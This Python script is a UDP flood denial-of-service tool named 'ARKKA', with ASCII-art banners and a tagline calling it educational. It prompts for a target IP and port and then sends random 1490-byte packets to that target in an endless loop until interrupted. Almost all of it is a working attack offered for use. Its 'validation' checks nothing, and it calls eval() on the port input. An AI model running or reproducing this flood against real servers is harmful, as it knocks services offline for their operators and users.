#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

validate = URLValidator()

#Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
#Banner :
print('''
 █████╗ ██████╗ ██╗  ██╗ █████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗
███████║██████╔╝█████╔╝ ███████║
██╔══██║██╔══██╗██╔═██╗ ██╔══██║
██║  ██║██║  ██║██║  ██╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝

𝔗𝔬𝔬𝔩 𝔡𝔡𝔬𝔰 𝔦𝔫𝔦 𝔥𝔞𝔫𝔶𝔞 𝔲𝔫𝔱𝔲𝔨 𝔢𝔡𝔲𝔨𝔞𝔰𝔦 𝔟𝔲𝔨𝔞𝔫 𝔲𝔫𝔱𝔲𝔨 𝔨𝔢𝔧𝔞𝔥𝔞𝔱𝔞𝔫. 𝔧𝔞𝔡𝔦, 𝔤𝔲𝔫𝔞𝔨𝔞𝔫 𝔩𝔞𝔥 𝔡𝔢𝔫𝔤𝔞𝔫 𝔟𝔞𝔦𝔨
𝖢𝗋𝖾𝖺𝗍𝗈𝗋 : Arka
𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 1.0
	''')
#Type your ip and port number (find IP address using nslookup or any online website) 
ip = input(" [+] Give ARKKA A Target IP : ")
port = eval(input(" [+] Starting Port NO : "))
os.system("clear")
print('''
█████╗ ██████╗ ██╗  ██╗ █████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗
███████║██████╔╝█████╔╝ ███████║
██╔══██║██╔══██╗██╔═██╗ ██╔══██║
██║  ██║██║  ██║██║  ██╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝

𝙷𝚃𝚃𝙿 𝚄𝚗𝚋𝚎𝚊𝚛𝚊𝚋𝚕𝚎 𝙻𝚘𝚊𝚍 𝙺𝚒𝚗𝚐
𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Arka
	''')
try:
	validate = ip
	print(" ✅ Valid IP Checked.... ")
	print(" [+] Attack Screen Loading ....")
except ValidationError as exception :
	print(" ✘ Input a right url")

#Lets start our attack
print(" ")
print("    That's my secret Cap, I am always muwani ")
print(" " )
print(" [+] ARKKA is attacking server " + ip )
print (" " )
time.sleep(5)
sent = 0
try :
 while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
		if port == 65534:
			port = 1
except KeyboardInterrupt:
	print(" ")
	print("\n [-] Ctrl+C Detected.........Exiting")
	print(" [-] DDOS ATTACK STOPPED")
input(" Enter To Exit")
os.system("clear")
print(" [-] ARKKA is tired...")
